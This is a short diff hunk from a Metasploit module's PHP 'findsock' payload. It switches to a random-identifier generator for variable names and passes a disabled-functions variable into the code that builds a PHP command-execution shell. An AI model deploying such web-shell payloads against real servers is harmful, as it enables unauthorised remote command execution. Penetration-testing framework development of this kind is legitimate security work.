@@ -40,16 +40,18 @@ module MetasploitModule
   end
 
   def php_findsock
-    var_cmd = '$' + Rex::Text.rand_text_alpha(6..9)
-    var_fd = '$' + Rex::Text.rand_text_alpha(6..9)
-    var_out = '$' + Rex::Text.rand_text_alpha(6..9)
+    vars = Rex::RandomIdentifier::Generator.new
+    var_cmd = '$' + vars[:var_cmd]
+    var_fd = '$' + vars[:var_fd]
+    var_out = '$' + vars[:var_out]
+    var_dis = '$' + vars[:var_dis]
     shell = <<~END_OF_PHP_CODE
-      #{php_preamble}
+      #{php_preamble(disabled_varname: var_dis)}
       print("<html><body>");
       flush();
 
       function mysystem(#{var_cmd}){
-        #{php_system_block(cmd_varname: var_cmd, output_varname: var_out)}
+        #{php_system_block(disabled_varname: var_dis, cmd_varname: var_cmd, output_varname: var_out)}
         return #{var_out};
       }
 
